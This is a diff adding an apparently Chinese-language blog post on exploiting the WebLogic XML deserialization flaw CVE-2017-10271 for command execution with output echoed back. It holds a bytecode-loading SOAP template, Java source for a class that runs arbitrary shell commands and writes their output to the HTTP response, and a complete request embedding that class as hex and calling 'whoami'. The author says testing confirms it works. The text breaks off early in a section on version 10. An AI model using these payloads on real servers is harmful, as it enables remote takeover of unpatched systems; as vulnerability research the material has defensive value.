@@ -1,0 +1,669 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <head>
+  <!-- 元数据 -->
+  <meta charset="utf-8">
+  <link rel="icon" href="images/favicon.ico">
+  <title>weblogicEcho&&memoryshell | fmyyy</title>
+  <meta name="author" content="fmyyy" />
+  <meta http-equiv="Cache-Control" content="no-transform" />
+  <meta http-equiv="Cache-Control" content="no-siteapp" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="robots" content="index,follow" />
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+  <meta name="format-detection" content="telphone=no, email=no" />
+  
+    <meta name="keywords" content="" />
+  
+  <meta name="description" content="字节码加载CVE-2017-10271是xml反序列化，可用如下poc加载字节码 123456789101112131415161718192021&lt;soapenv:Envelope xmlns:soapenv&#x3D;&quot;http:&#x2F;&#x2F;schemas.xmlsoap.org&#x2F;soap&#x2F;envelope&#x2F;&quot;&gt;    &lt;soapenv:Header&gt;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="weblogicEcho&amp;&amp;memoryshell">
+<meta property="og:url" content="https://fmyyy.gitee.io/2022/05/06/weblogicEcho/index.html">
+<meta property="og:site_name" content="fmyyy">
+<meta property="og:description" content="字节码加载CVE-2017-10271是xml反序列化，可用如下poc加载字节码 123456789101112131415161718192021&lt;soapenv:Envelope xmlns:soapenv&#x3D;&quot;http:&#x2F;&#x2F;schemas.xmlsoap.org&#x2F;soap&#x2F;envelope&#x2F;&quot;&gt;    &lt;soapenv:Header&gt;">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://fmyyy.gitee.io/images/favicon.ico">
+<meta property="article:published_time" content="2022-05-06T11:14:04.000Z">
+<meta property="article:modified_time" content="2022-05-08T14:45:39.071Z">
+<meta property="article:author" content="fmyyy">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://fmyyy.gitee.io/images/favicon.ico">
+<meta name="twitter:site" content="@null">
+  
+  <!-- 站点验证相关 -->
+  
+    
+    
+    
+  
+  <!-- 样式表文件 -->
+  <link rel="stylesheet" id="kratos-css" href="/css/kratosr.min.css" type="text/css" media="all">
+  
+    <link rel="stylesheet" id="highlight-css" href="/css/highlight/night-eighties.min.css" type="text/css" media="all">
+  
+  
+  <link rel="stylesheet" id="fontawe-css" href="https://cdn.jsdelivr.net/npm/font-awesome@4.7.0/css/font-awesome.min.css" type="text/css" media="all">
+  <link rel="stylesheet" id="nprogress-css" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" type="text/css" media="all">
+  
+  
+  
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css">
+  
+  
+    <link rel="stylesheet" id="darkmode-css" href="/css/kr-dark.min.css" type="text/css" media="all">
+  
+  <!-- 不得不预先加载的一些JS文件 -->
+  <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js"></script>
+  
+    <script src="https://cdn.jsdelivr.net/npm/qrcode_js@1.0.0/qrcode.min.js"></script>
+  
+  
+  <style>
+    
+      .kratos-cover.kratos-cover-2 {
+        background-image: url('/images/hf1.jpg');
+      }
+    
+    
+      @media(min-width:768px) {
+        body.custom-background {
+          background-image: url('/images/bg.webp');
+        }
+      }
+    
+  </style>
+  
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+    <body class="custom-background">
+        <div id="kratos-wrapper">
+    <div id="kratos-page">
+        <div id="kratos-header">
+            <header id="kratos-desktop-topnav" class="kratos-topnav">
+                <div class="container">
+                    <div class="nav-header">
+                        <nav id="kratos-menu-wrap">
+                            <ul id="kratos-primary-menu" class="sf-menu">
+                                
+                                    
+                                        <li><a href="/"><i class="fa fa-home"></i>首页</a></li>
+                                    
+                                
+                                    
+                                        <li><a href="/archives/"><i class="fa fa-file"></i>归档</a></li>
+                                    
+                                
+                                    
+                                        <li><a href="/friends/"><i class="fa fa-paw"></i>Friends</a></li>
+                                    
+                                
+                                    
+                                        <li>
+                                            <a><i class="fa fa-link"></i>链接</a>
+                                            <ul class="sub-menu">
+                                                
+                                                    
+                                                
+                                                    
+                                                        <li><a target="_blank" rel="noopener" href="https://blog.csdn.net/fmyyy1">CSDN</a></li>
+                                                    
+                                                
+                                            </ul>
+                                        </li>
+                                    
+                                
+                                    
+                                        <li>
+                                            <a><i class="fa fa-link"></i>联系</a>
+                                            <ul class="sub-menu">
+                                                
+                                                    
+                                                
+                                                    
+                                                        <li><a href="/null">QQ:254005846</a></li>
+                                                    
+                                                
+                                            </ul>
+                                        </li>
+                                    
+                                
+                            </ul>
+                        </nav>
+                    </div>
+                </div>
+            </header>
+            <header id="kratos-mobile-topnav" class="kratos-topnav">
+                <div class="container">
+                    <div class="color-logo"><a href="/">fmyyy</a></div>
+                    <div class="nav-toggle">
+                        <a class="kratos-nav-toggle js-kratos-nav-toggle">
+                            <i></i>
+                        </a>
+                    </div>
+                </div>
+            </header>
+        </div>
+        <div class="kratos-start kratos-hero-2">
+            <!-- <div class="kratos-overlay"></div> -->
+            <div class="kratos-cover kratos-cover-2 text-center">
+                <div class="desc desc2 animate-box">
+                    <a href="/">
+                        <h2>fmyyy</h2> <br />
+                        <span></span>
+                    </a>
+                </div>
+            </div>
+        </div>
+
+        <div id="kratos-blog-post">
+            <div class="container">
+                <div id="main" class="row">
+                    
+
+        
+
+            <section class="col-md-8">
+
+        
+
+            <article>
+    <div class="kratos-hentry kratos-post-inner clearfix">
+        <header class="kratos-entry-header">
+            
+                <h1 class="kratos-entry-title text-center">weblogicEcho&&memoryshell</h1>
+            
+            
+            <ul class="kratos-post-meta text-center">
+                <li><i class="fa fa-calendar"></i> 2022-05-06</li>
+                <li><i class="fa fa-user"></i> 作者 fmyyy</li>
+                <li>
+                    <i class="fa fa-edit"></i> 
+                    
+                    
+                        ~21.74K
+                    
+                    字
+                </li>
+                
+            </ul>
+        </header>
+        <div class="kratos-post-content">
+            <div id="expire-alert" class="alert alert-warning hidden" role="alert">
+                本文最后编辑于 <time datetime="1652021139071"></time> 前，其中的内容可能需要更新。
+            </div>
+            
+                <div class="kratos-post-inner-toc">
+                    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AD%97%E8%8A%82%E7%A0%81%E5%8A%A0%E8%BD%BD"><span class="toc-number">1.</span> <span class="toc-text">字节码加载</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ECHO"><span class="toc-number">2.</span> <span class="toc-text">ECHO</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#12"><span class="toc-number">2.1.</span> <span class="toc-text">12</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#10"><span class="toc-number">2.2.</span> <span class="toc-text">10</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#memoryshell"><span class="toc-number">3.</span> <span class="toc-text">memoryshell</span></a></li></ol>
+                </div>
+            
+            <hr />
+            <h2 id="字节码加载"><a href="#字节码加载" class="headerlink" title="字节码加载"></a>字节码加载</h2><p>CVE-2017-10271是xml反序列化，可用如下poc加载字节码</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">soapenv:Envelope</span> <span class="attr">xmlns:soapenv</span>=<span class="string">&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">soapenv:Header</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">work:WorkContext</span> <span class="attr">xmlns:work</span>=<span class="string">&quot;http://bea.com/2004/06/soap/workarea/&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">java</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">void</span> <span class="attr">class</span>=<span class="string">&quot;weblogic.utils.Hex&quot;</span> <span class="attr">method</span>=<span class="string">&quot;fromHexString&quot;</span> <span class="attr">id</span>=<span class="string">&quot;cls&quot;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">string</span>&gt;</span>hexString<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">void</span> <span class="attr">class</span>=<span class="string">&quot;org.mozilla.classfile.DefiningClassLoader&quot;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">&quot;defineClass&quot;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">string</span>&gt;</span>类名<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">object</span> <span class="attr">idref</span>=<span class="string">&quot;cls&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">object</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">&quot;newInstance&quot;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">               <span class="tag">&lt;/<span class="name">java</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">work:WorkContext</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">soapenv:Header</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">soapenv:Body</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">soapenv:Envelope</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="ECHO"><a href="#ECHO" class="headerlink" title="ECHO"></a>ECHO</h2><h3 id="12"><a href="#12" class="headerlink" title="12"></a>12</h3><p>10版本和12版本的回显不太一样</p>
+<p>在网上找到的12版本的回显,去掉一些报错可以直接用了</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.PrintWriter;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">import</span> weblogic.servlet.internal.HttpConnectionHandler;</span><br><span class="line"><span class="keyword">import</span> weblogic.servlet.internal.ServletRequestImpl;</span><br><span class="line"><span class="keyword">import</span> weblogic.servlet.internal.ServletResponseImpl;</span><br><span class="line"><span class="keyword">import</span> weblogic.servlet.internal.WebAppServletContext;</span><br><span class="line"><span class="keyword">import</span> weblogic.work.ExecuteThread;</span><br><span class="line"><span class="keyword">import</span> weblogic.work.WorkAdapter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">XmlExp</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">XmlExp</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">say</span><span class="params">(String cmd)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        ExecuteThread executeThread = (ExecuteThread)Thread.currentThread();</span><br><span class="line">        ServletResponseImpl servletResponse = <span class="keyword">null</span>;</span><br><span class="line">        WorkAdapter workAdapter = executeThread.getCurrentWork();</span><br><span class="line">        WebAppServletContext webAppServletContext = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">if</span> (workAdapter.getClass().getName().contains(<span class="string">&quot;ContainerSupportProviderImpl&quot;</span>)) &#123;</span><br><span class="line">            Field field = workAdapter.getClass().getDeclaredField(<span class="string">&quot;connectionHandler&quot;</span>);</span><br><span class="line">            field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            HttpConnectionHandler httpConnectionHandler = (HttpConnectionHandler)field.get(workAdapter);</span><br><span class="line">            webAppServletContext = httpConnectionHandler.getServletRequest().getContext();</span><br><span class="line">            servletResponse = httpConnectionHandler.getServletResponse();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        String path = webAppServletContext.getRootTempDir().getAbsolutePath() + <span class="string">&quot;/war/aa.txt&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span> (cmd.equalsIgnoreCase(<span class="string">&quot;givemewlswarpath&quot;</span>)) &#123;</span><br><span class="line">            servletResponse.getWriter().write(path);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">boolean</span> isLinux = <span class="keyword">true</span>;</span><br><span class="line">            String osTyp = System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (osTyp != <span class="keyword">null</span> &amp;&amp; osTyp.toLowerCase().contains(<span class="string">&quot;win&quot;</span>)) &#123;</span><br><span class="line">                isLinux = <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            List cmds = <span class="keyword">new</span> ArrayList();</span><br><span class="line">            PrintWriter printWriter = <span class="keyword">new</span> PrintWriter(path + <span class="string">&quot;x&quot;</span>);</span><br><span class="line">            printWriter.println(path);</span><br><span class="line">            printWriter.close();</span><br><span class="line">            <span class="keyword">if</span> (cmd.startsWith(<span class="string">&quot;$NO$&quot;</span>)) &#123;</span><br><span class="line">                cmds.add(cmd.substring(<span class="number">4</span>));</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (isLinux) &#123;</span><br><span class="line">                cmds.add(<span class="string">&quot;/bin/bash&quot;</span>);</span><br><span class="line">                cmds.add(<span class="string">&quot;-c&quot;</span>);</span><br><span class="line">                cmds.add(cmd);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                cmds.add(<span class="string">&quot;cmd.exe&quot;</span>);</span><br><span class="line">                cmds.add(<span class="string">&quot;/c&quot;</span>);</span><br><span class="line">                cmds.add(cmd);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            ProcessBuilder processBuilder = <span class="keyword">new</span> ProcessBuilder(cmds);</span><br><span class="line">            processBuilder.redirectErrorStream(<span class="keyword">true</span>);</span><br><span class="line">            Process proc = processBuilder.start();</span><br><span class="line">            servletResponse.getServletOutputStream().writeStream(proc.getInputStream());</span><br><span class="line">            servletResponse.getWriter().write(<span class="string">&quot;&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>测试之后确实可以</p>
+<p><img src="https://img.le1a.com/2022/05/08/d8a5e410b08e9.png" alt="1651999295519.png"></p>
+<p><img src="https://img.le1a.com/2022/05/08/e1f0d7a490958.png" alt="1652011291410.png"></p>
+<p><code>weblogic.servlet.provider.ContainerSupportProviderImpl</code>的内部类<code>WlsRequestExecutor</code>的cinnectionHandler属性为<code>HttpConnectionHandler</code>类实例</p>
+<p><img src="https://img.le1a.com/2022/05/08/e494e4f8b8038.png" alt="1652010802471.png"></p>
+<p><img src="https://img.le1a.com/2022/05/08/2105135d0611a.png" alt="1652010829169.png"></p>
+<p>HttpConnectionHandler可以获取response</p>
+<p><img src="https://img.le1a.com/2022/05/08/157dfb4e777db.png" alt="1652000522900.png"></p>
+<p>poc</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">soapenv:Envelope</span> <span class="attr">xmlns:soapenv</span>=<span class="string">&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">soapenv:Header</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">work:WorkContext</span> <span class="attr">xmlns:work</span>=<span class="string">&quot;http://bea.com/2004/06/soap/workarea/&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">java</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">void</span> <span class="attr">class</span>=<span class="string">&quot;weblogic.utils.Hex&quot;</span> <span class="attr">method</span>=<span class="string">&quot;fromHexString&quot;</span> <span class="attr">id</span>=<span class="string">&quot;cls&quot;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">string</span>&gt;</span>0xcafebabe0000003400f90a003b006d0a006e006f0700700a000300710a003b00720a007300740800750a007600770800780a007300790a007a007b0a007a007c07007d0a000d007e0a007f00800a000d00810a007600820a007600830800840700850a0014006d0a008600870a008800890a0014008a08008b0a0014008c08008d0a0076008e0a008f00900a002500910800920a009300940a007600950800960700970a0023006d0700980800990a0025009a0a0025009b0a0025009c08009d0a0076009e0a0076009f0b00a000a10800a20800a30800a40800a50700a60a003200a70a003200a80a003200a90a008f00aa0a00ab00ac0a00ad00ae0800af0700b00700b10100063c696e69743e010003282956010004436f646501000f4c696e654e756d6265725461626c650100124c6f63616c5661726961626c655461626c65010004746869730100084c586d6c4578703b010003736179010015284c6a6176612f6c616e672f537472696e673b29560100056669656c640100194c6a6176612f6c616e672f7265666c6563742f4669656c643b01001568747470436f6e6e656374696f6e48616e646c65720100314c7765626c6f6769632f736572766c65742f696e7465726e616c2f48747470436f6e6e656374696f6e48616e646c65723b01000769734c696e75780100015a0100056f735479700100124c6a6176612f6c616e672f537472696e673b010004636d64730100104c6a6176612f7574696c2f4c6973743b01000b7072696e745772697465720100154c6a6176612f696f2f5072696e745772697465723b01000e70726f636573734275696c64657201001a4c6a6176612f6c616e672f50726f636573734275696c6465723b01000470726f630100134c6a6176612f6c616e672f50726f636573733b010003636d6401000d6578656375746554687265616401001d4c7765626c6f6769632f776f726b2f457865637574655468726561643b01000f736572766c6574526573706f6e736501002f4c7765626c6f6769632f736572766c65742f696e7465726e616c2f536572766c6574526573706f6e7365496d706c3b01000b776f726b4164617074657201001b4c7765626c6f6769632f776f726b2f576f726b416461707465723b010014776562417070536572766c6574436f6e746578740100304c7765626c6f6769632f736572766c65742f696e7465726e616c2f576562417070536572766c6574436f6e746578743b0100047061746801000d537461636b4d61705461626c650700b00700b20700700700b30700b40700b50700b607009801000a457863657074696f6e730700b70100104d6574686f64506172616d657465727301000a536f7572636546696c6501000b586d6c4578702e6a6176610c003c003d0700b80c00b900ba01001b7765626c6f6769632f776f726b2f457865637574655468726561640c00bb00bc0c00bd00be0700bf0c00c000c101001c436f6e7461696e6572537570706f727450726f7669646572496d706c0700b20c00c200c3010011636f6e6e656374696f6e48616e646c65720c00c400c50700c60c00c700c80c00c900ca01002f7765626c6f6769632f736572766c65742f696e7465726e616c2f48747470436f6e6e656374696f6e48616e646c65720c00cb00cc0700cd0c00ce00cf0c00d000d10c00d200c10c00d300d401000677686f616d690100176a6176612f6c616e672f537472696e674275696c6465720700b50c00d500d60700d70c00d800c10c00d900da01000b2f7761722f61612e7478740c00db00c1010010676976656d65776c73776172706174680c00dc00dd0700b30c00de00df0c00e000440100076f732e6e616d650700e10c00e200e30c00e400c101000377696e0100136a6176612f7574696c2f41727261794c6973740100136a6176612f696f2f5072696e74577269746572010001780c003c00440c00e500440c00e6003d010004244e4f240c00e700dd0c00e800e90700b60c00ea00eb0100092f62696e2f626173680100022d63010007636d642e6578650100022f630100186a6176612f6c616e672f50726f636573734275696c6465720c003c00ec0c00ed00ee0c00ef00f00c00f100f20700f30c00f400f50700f60c00f700f8010000010006586d6c4578700100106a6176612f6c616e672f4f626a6563740100106a6176612f6c616e672f537472696e6701002d7765626c6f6769632f736572766c65742f696e7465726e616c2f536572766c6574526573706f6e7365496d706c0100197765626c6f6769632f776f726b2f576f726b4164617074657201002e7765626c6f6769632f736572766c65742f696e7465726e616c2f576562417070536572766c6574436f6e7465787401000e6a6176612f7574696c2f4c6973740100136a6176612f6c616e672f457863657074696f6e0100106a6176612f6c616e672f54687265616401000d63757272656e7454687265616401001428294c6a6176612f6c616e672f5468726561643b01000e67657443757272656e74576f726b01001d28294c7765626c6f6769632f776f726b2f576f726b416461707465723b010008676574436c61737301001328294c6a6176612f6c616e672f436c6173733b01000f6a6176612f6c616e672f436c6173730100076765744e616d6501001428294c6a6176612f6c616e672f537472696e673b010008636f6e7461696e7301001b284c6a6176612f6c616e672f4368617253657175656e63653b295a0100106765744465636c617265644669656c6401002d284c6a6176612f6c616e672f537472696e673b294c6a6176612f6c616e672f7265666c6563742f4669656c643b0100176a6176612f6c616e672f7265666c6563742f4669656c6401000d73657441636365737369626c65010004285a2956010003676574010026284c6a6176612f6c616e672f4f626a6563743b294c6a6176612f6c616e672f4f626a6563743b010011676574536572766c65745265717565737401003028294c7765626c6f6769632f736572766c65742f696e7465726e616c2f536572766c657452657175657374496d706c3b01002c7765626c6f6769632f736572766c65742f696e7465726e616c2f536572766c657452657175657374496d706c01000a676574436f6e7465787401003228294c7765626c6f6769632f736572766c65742f696e7465726e616c2f576562417070536572766c6574436f6e746578743b010012676574536572766c6574526573706f6e736501003128294c7765626c6f6769632f736572766c65742f696e7465726e616c2f536572766c6574526573706f6e7365496d706c3b0100047472696d0100066c656e67746801000328294901000e676574526f6f7454656d7044697201001028294c6a6176612f696f2f46696c653b01000c6a6176612f696f2f46696c6501000f6765744162736f6c75746550617468010006617070656e6401002d284c6a6176612f6c616e672f537472696e673b294c6a6176612f6c616e672f537472696e674275696c6465723b010008746f537472696e67010010657175616c7349676e6f726543617365010015284c6a6176612f6c616e672f537472696e673b295a01000967657457726974657201001728294c6a6176612f696f2f5072696e745772697465723b01000577726974650100106a6176612f6c616e672f53797374656d01000b67657450726f7065727479010026284c6a6176612f6c616e672f537472696e673b294c6a6176612f6c616e672f537472696e673b01000b746f4c6f776572436173650100077072696e746c6e010005636c6f736501000a73746172747357697468010009737562737472696e670100152849294c6a6176612f6c616e672f537472696e673b010003616464010015284c6a6176612f6c616e672f4f626a6563743b295a010013284c6a6176612f7574696c2f4c6973743b295601001372656469726563744572726f7253747265616d01001d285a294c6a6176612f6c616e672f50726f636573734275696c6465723b010005737461727401001528294c6a6176612f6c616e672f50726f636573733b010016676574536572766c65744f757470757453747265616d01003528294c7765626c6f6769632f736572766c65742f696e7465726e616c2f536572766c65744f757470757453747265616d496d706c3b0100116a6176612f6c616e672f50726f6365737301000e676574496e70757453747265616d01001728294c6a6176612f696f2f496e70757453747265616d3b0100317765626c6f6769632f736572766c65742f696e7465726e616c2f536572766c65744f757470757453747265616d496d706c01000b777269746553747265616d010018284c6a6176612f696f2f496e70757453747265616d3b29560021003a003b0000000000020001003c003d0001003e0000003300010001000000052ab70001b100000002003f0000000a00020000000d0004000e00400000000c0001000000050041004200000001004300440003003e0000030e0004000d0000016db80002c000034d014e2cb600043a04013a051904b60005b600061207b600089900311904b600051209b6000a3a06190604b6000b19061904b6000cc0000d3a071907b6000eb6000f3a051907b600104e2bc6000d2bb60011b600129a000612134cbb001459b700151905b60016b60017b600181219b60018b6001a3a062b121bb6001c99000f2db6001d1906b6001ea700dd043607121fb800203a081908c600131908b600211222b60008990006033607bb002359b700243a09bb002559bb001459b700151906b600181226b60018b6001ab700273a0a190a1906b60028190ab600292b122ab6002b99001319092b07b6002cb9002d020057a7004515079900231909122eb9002d0200571909122fb9002d02005719092bb9002d020057a7002019091230b9002d02005719091231b9002d02005719092bb9002d020057bb0032591909b700333a0b190b04b6003457190bb600353a0c2db60036190cb60037b600382db6001d1239b6001eb100000003003f0000009a0026000000110007001200090013000f00140012001500220016002e00170034001800400019004a001a0050001d005e001e00610021007d0022008600230092002500950026009c002700ae002800b1002b00ba002c00d7002d00de002e00e3002f00ec003000fc003101010032010b00330115003401210036012b003701350038013e003b0149003c0150003d0157003e0163003f016c0041004000000098000f002e002200450046000600400010004700480007009500d70049004a0007009c00d0004b004c000800ba00b2004d004e000900d70095004f0050000a0149002300510052000b0157001500530054000c0000016d0041004200000000016d0055004c00010007016600560057000200090164005800590003000f015e005a005b00040012015b005c005d0005007d00f0005e004c0006005f000000510009ff0050000607006007006107006207006307006407006500000d02fc0030070061fd001e01070061fd004a070066070067241cff002d0007070060070061070062070063070064070065070061000000680000000400010069006a0000000501005500000001006b00000002006c<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">void</span> <span class="attr">class</span>=<span class="string">&quot;org.mozilla.classfile.DefiningClassLoader&quot;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">&quot;defineClass&quot;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">string</span>&gt;</span>XmlExp<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">object</span> <span class="attr">idref</span>=<span class="string">&quot;cls&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">object</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">&quot;newInstance&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">&quot;say&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">string</span>&gt;</span>whoami<span class="tag">&lt;/<span class="name">string</span>&gt;</span><span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">               <span class="tag">&lt;/<span class="name">java</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">work:WorkContext</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">soapenv:Header</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">soapenv:Body</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">soapenv:Envelope</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">asy:onAsyncDelivery</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">soapenv:Body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">soapenv:Envelope</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="10"><a href="#10" class="headerlink" title="10"></a>10</h3><p>再去看看10版本的</p>
+<p>貌似10版本只有10.3.6.0受影响</p>
+<p>后来看到，似乎可以直接在xml里构造回显</p>
